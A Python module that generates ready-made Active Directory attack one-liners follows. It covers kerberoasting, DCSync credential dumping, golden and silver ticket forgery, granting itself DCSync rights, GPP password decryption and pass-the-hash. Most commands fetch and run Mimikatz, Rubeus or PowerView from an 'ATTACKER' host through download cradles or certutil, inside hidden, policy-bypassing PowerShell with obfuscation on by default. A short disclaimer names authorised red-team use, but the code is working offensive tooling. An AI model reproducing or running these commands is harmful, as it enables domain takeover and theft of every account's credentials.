"""
Active Directory attack template generator.
Returns PowerShell and cmd.exe one-liners for common AD post-exploitation
techniques including kerberoasting, ticket attacks, DCSync, and enumeration.
For use in authorized red team exercises only.
"""
from dataclasses import dataclass

from .obfuscate import ps_tick_marks

_RUBEUS_PATH = r"C:\Windows\Temp\Rubeus.exe"


def _iex_cradle(url: str, body: str) -> str:
    return f"IEX (New-Object Net.WebClient).DownloadString('{url}');{body}"


SUPPORTED_TECHNIQUES = (
    "kerberoast",
    "asrep_roast",
    "dcsync",
    "bloodhound_collect",
    "ldap_enum",
    "pass_the_ticket",
    "golden_ticket",
    "silver_ticket",
    "acl_dcsync",
    "gpp_password",
    "overpass_the_hash",
    "zerologon_check",
)


@dataclass
class ADAttackResult:
    command: str
    technique: str
    notes: str


# ── Techniques ────────────────────────────────────────────────────────────────

def _kerberoast(domain: str, dc_host: str, username: str, password: str,
                hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    cmd = _iex_cradle(
        "https://ATTACKER/PowerView.ps1",
        f"Invoke-Kerberoast -Domain {domain} -OutputFormat Hashcat"
        f" | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII {outfile}",
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="kerberoast",
        notes=(
            f"Hashes in {outfile}. "
            f"Crack with: hashcat -m 13100 {outfile} /usr/share/wordlists/rockyou.txt --force"
        ),
    )


def _asrep_roast(domain: str, dc_host: str, username: str, password: str,
                 hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    cmd = (
        f"certutil -urlcache -split -f https://ATTACKER/Rubeus.exe {_RUBEUS_PATH} && "
        f"{_RUBEUS_PATH} asreproast /domain:{domain} /dc:{dc_host} /format:hashcat /outfile:{outfile}"
    )
    return ADAttackResult(
        command=cmd,
        technique="asrep_roast",
        notes=(
            "Rubeus required (replace ATTACKER). "
            "Targets accounts with 'Do not require Kerberos preauthentication'. "
            f"Crack: hashcat -m 18200 {outfile} rockyou.txt"
        ),
    )


def _dcsync(domain: str, dc_host: str, username: str, password: str,
            hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    cmd = _iex_cradle(
        "https://ATTACKER/Invoke-Mimikatz.ps1",
        f"Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:{domain} /all /csv\"'"
        f" | Out-File -Encoding ASCII {outfile}",
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="dcsync",
        notes=(
            "Requires Domain Admin or DCSync ACL rights. "
            "Dump contains NTLM hashes for all accounts. "
            "For single account: /user:krbtgt"
        ),
    )


def _bloodhound_collect(domain: str, dc_host: str, username: str, password: str,
                        hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    sharp = "C:\\Windows\\Temp\\SharpHound.exe"
    zip_out = "C:\\Windows\\Temp\\bh_out.zip"
    cmd = (
        f"certutil -urlcache -split -f https://ATTACKER/SharpHound.exe {sharp} && "
        f"{sharp} --CollectionMethods All --Domain {domain} --ZipFileName {zip_out} && "
        f"del /f /q {sharp}"
    )
    return ADAttackResult(
        command=cmd,
        technique="bloodhound_collect",
        notes=(
            f"Replace ATTACKER. Import {zip_out} into BloodHound GUI. "
            "--CollectionMethods All includes sessions, ACLs, GPOs, trusts, containers."
        ),
    )


def _ldap_enum(domain: str, dc_host: str, username: str, password: str,
               hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    # Native PS LDAP — no RSAT or external modules required
    cmd = (
        f"$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();"
        f"$r=$d.GetDirectoryEntry();"
        f"$s=New-Object System.DirectoryServices.DirectorySearcher($r);"
        f"$s.Filter='(objectClass=user)';"
        f"$s.PropertiesToLoad.Add('samaccountname')|Out-Null;"
        f"$s.PropertiesToLoad.Add('memberof')|Out-Null;"
        f"$res=$s.FindAll();"
        f"$res | ForEach-Object {{ [PSCustomObject]@{{User=$_.Properties['samaccountname'][0];"
        f"Groups=($_.Properties['memberof'] -join ',')}} }}"
        f" | Export-Csv -NoTypeInformation {outfile}"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="ldap_enum",
        notes=(
            f"Native PS LDAP — no RSAT or external modules. "
            f"Enumerates domain users and group memberships. Output: {outfile}"
        ),
    )


def _pass_the_ticket(domain: str, dc_host: str, username: str, password: str,
                     hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    # Use RC4 (NT hash) when caller supplies a hash rather than a password
    cred_arg = f"/rc4:{hash_nt}" if hash_nt else f"/password:{password}"
    cmd = (
        f"certutil -urlcache -split -f https://ATTACKER/Rubeus.exe {_RUBEUS_PATH} && "
        f"{_RUBEUS_PATH} asktgt /user:{username} {cred_arg} /domain:{domain} /dc:{dc_host} /ptt"
    )
    return ADAttackResult(
        command=cmd,
        technique="pass_the_ticket",
        notes=(
            "TGT injected into current session (/ptt). "
            "Verify: klist. Use Rubeus dump to extract .kirbi for offline use."
        ),
    )


def _golden_ticket(domain: str, dc_host: str, username: str, password: str,
                   hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    cmd = _iex_cradle(
        "https://ATTACKER/Invoke-Mimikatz.ps1",
        f"Invoke-Mimikatz -Command '\"kerberos::golden /user:Administrator"
        f" /domain:{domain} /sid:DOMAIN-SID /krbtgt:KRBTGT_NTHASH /ptt\"'",
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="golden_ticket",
        notes=(
            "Replace DOMAIN-SID (Get-ADDomain | Select-Object DomainSID) and "
            "KRBTGT_NTHASH (from dcsync). Valid 10 years by default. /ptt injects immediately."
        ),
    )


def _silver_ticket(domain: str, dc_host: str, username: str, password: str,
                   hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    cmd = _iex_cradle(
        "https://ATTACKER/Invoke-Mimikatz.ps1",
        f"Invoke-Mimikatz -Command '\"kerberos::golden /user:Administrator"
        f" /domain:{domain} /sid:DOMAIN-SID /target:{dc_host}.{domain}"
        f" /service:cifs /rc4:TARGET_MACHINE_NTHASH /ptt\"'",
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="silver_ticket",
        notes=(
            "Replace DOMAIN-SID and TARGET_MACHINE_NTHASH (machine account hash from dcsync). "
            "/service:cifs gives SMB access. No DC contact required — stealthier than golden ticket."
        ),
    )


def _acl_dcsync(domain: str, dc_host: str, username: str, password: str,
                hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    dc_components = ",".join(f"DC={part}" for part in domain.split("."))
    cmd = _iex_cradle(
        "https://ATTACKER/PowerView.ps1",
        f"Add-DomainObjectAcl -TargetIdentity '{dc_components}'"
        f" -PrincipalIdentity {username} -Rights DCSync -Domain {domain} -Verbose",
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="acl_dcsync",
        notes=(
            f"Run as Domain Admin. Grants {username} the Replicating Directory Changes + "
            "Replicating Directory Changes All rights. Then run dcsync technique as that user."
        ),
    )


def _gpp_password(domain: str, dc_host: str, username: str, password: str,
                  hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    # AES key is public knowledge since MS14-025 — not a credential, it's a fixed Microsoft constant
    aes_key = (
        "0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,"
        "0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b"
    )
    cmd = (
        f"$key=[byte[]]@({aes_key});"
        f"$files=Get-ChildItem -Path '\\\\{domain}\\SYSVOL' -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml';"
        f"$files|ForEach-Object{{[xml]$x=Get-Content $_.FullName;"
        f"$x.Groups.User|Where-Object{{$_.Properties.cpassword}}|ForEach-Object{{"
        f"$enc=[Convert]::FromBase64String($_.Properties.cpassword);"
        f"$aes=New-Object Security.Cryptography.AesCryptoServiceProvider;"
        f"$aes.Key=$key;$aes.IV=New-Object byte[] 16;$aes.Padding='PKCS7';$aes.Mode='CBC';"
        f"$dec=[Text.Encoding]::Unicode.GetString(($aes.CreateDecryptor()).TransformFinalBlock($enc,0,$enc.Length));"
        f"[PSCustomObject]@{{File=$_.FullName;User=$_.Properties.userName;Pass=$dec}}"
        f"}}}} | Format-List"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="gpp_password",
        notes=(
            "AES key is public (MS14-025). "
            "Searches SYSVOL for GPP cpassword fields. No tools required."
        ),
    )


def _overpass_the_hash(domain: str, dc_host: str, username: str, password: str,
                       hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    cmd = (
        f"certutil -urlcache -split -f https://ATTACKER/Rubeus.exe {_RUBEUS_PATH} && "
        f"{_RUBEUS_PATH} asktgt /user:{username} /rc4:{hash_nt} /domain:{domain} /dc:{dc_host} /ptt"
    )
    return ADAttackResult(
        command=cmd,
        technique="overpass_the_hash",
        notes=(
            "RC4 (NT hash) used to request TGT — avoids plaintext password. "
            "/ptt injects ticket into session. "
            "Stronger opsec than direct PTH — generates TGT event (4768) not NTLM (4776)."
        ),
    )


def _zerologon_check(domain: str, dc_host: str, username: str, password: str,
                     hash_nt: str, outfile: str, obfuscate: bool) -> ADAttackResult:
    cmd = f"python3 /opt/impacket/examples/zerologon_tester.py {dc_host} DC_IP_ADDRESS"
    return ADAttackResult(
        command=cmd,
        technique="zerologon_check",
        notes=(
            "Linux/impacket tool. Install: pip install impacket. "
            "Non-destructive check only — does NOT exploit. "
            "Exploitation changes DC machine account password; only run in lab or with "
            "explicit written permission and a recovery plan."
        ),
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "kerberoast": _kerberoast,
    "asrep_roast": _asrep_roast,
    "dcsync": _dcsync,
    "bloodhound_collect": _bloodhound_collect,
    "ldap_enum": _ldap_enum,
    "pass_the_ticket": _pass_the_ticket,
    "golden_ticket": _golden_ticket,
    "silver_ticket": _silver_ticket,
    "acl_dcsync": _acl_dcsync,
    "gpp_password": _gpp_password,
    "overpass_the_hash": _overpass_the_hash,
    "zerologon_check": _zerologon_check,
}


def generate_adattack(
    technique: str,
    domain: str = "DOMAIN.LOCAL",
    dc_host: str = "DC01",
    username: str = "USER",
    password: str = "PASS",
    hash_nt: str = "",
    outfile: str = "C:\\Windows\\Temp\\ad_out.txt",
    obfuscate: bool = True,
) -> ADAttackResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](domain, dc_host, username, password, hash_nt, outfile, obfuscate)
